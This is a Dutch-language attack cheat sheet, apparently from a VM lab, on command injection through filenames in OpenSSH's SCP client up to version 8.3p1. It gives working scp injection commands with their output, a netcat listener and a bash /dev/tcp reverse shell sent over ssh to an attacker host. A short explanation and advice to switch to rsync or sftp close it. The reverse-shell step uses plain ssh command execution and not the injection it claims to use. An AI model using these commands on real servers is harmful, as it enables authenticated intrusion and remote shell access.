# Cheat sheet aanval Open SSH  

Deze kwetsbaarheid zit in de SCP-client van OpenSSH (versies <= 8.3p1). SCP voert commando's uit op basis van bestandsnamen zonder ze goed te saniteren. Daardoor kan een aanvaller met geldige SSH-credentials kwaadaardige commando’s injecteren via bestandsnamen.

Stap 1: Controleer of de VM's met elkaar kunnen communiceren

```bash
ping 192.168.0.163 
PING 192.168.0.163 (192.168.0.163) 56(84) bytes of data.
64 bytes from 192.168.0.163: icmp_seq=1 ttl=64 time=16.1 ms
64 bytes from 192.168.0.163: icmp_seq=2 ttl=64 time=7.04 ms
64 bytes from 192.168.0.163: icmp_seq=3 ttl=64 time=7.80 ms
64 bytes from 192.168.0.163: icmp_seq=4 ttl=64 time=7.78 ms
64 bytes from 192.168.0.163: icmp_seq=5 ttl=64 time=8.33 ms
```

SCP command injection

```bash
scp test.txt osboxes@192.168.0.163:/tmp/$(echo hello)

osboxes@192.168.0.163's password: 
test.txt                                                                                                                                                   100%    0     0.0KB/s   00:00   
```

Resultaat: er verschijnt een bestand hello op de server in /tmp, aangemaakt door de injectie.

```bash
osboxes@osboxes:/tmp$ ls
hello
```

## Meer geavanceerde commando's

```bash
scp test.txt "osboxes@192.168.0.163:'/tmp/$(touch /tmp/exploit_file)'"

ls /tmp/exploit_file
```


## Reverse shell via netcat

We kunnen nog een beetje verdergaan en een reverse shell opstarten via netcat. Dit doen we door misbruik te maken van de command injection in ssh.

Start een netcat listener op de aanvaller machine

```bash
nc -lvnp 4444
```

Reverse shell via SSH

```bash
ssh osboxes@192.168.0.163 'bash -i >& /dev/tcp/192.168.0.251/4444 0>&1'
```

## Hoe werkt het?

- SCP werkt door een commando scp -t <bestandsnaam> uit te voeren op de remote host om bestanden te ontvangen.

- De bestandsnaam wordt niet gesanitiseerd waardoor shell-injectie via backticks of $(...) mogelijk is.

- Dit is een authenticated exploit: je moet wel over geldige SSH-credentials beschikken.

## Waarom is het belangrijk om je servers te beschermen?

- Veel systemen gebruiken SCP nog steeds voor bestanden overzetten.

- Kwaadwillenden met toegang kunnen zo eenvoudig commando’s uitvoeren op de server.

- OpenSSH adviseert over te stappen op veiligere alternatieven zoals rsync of sftp.
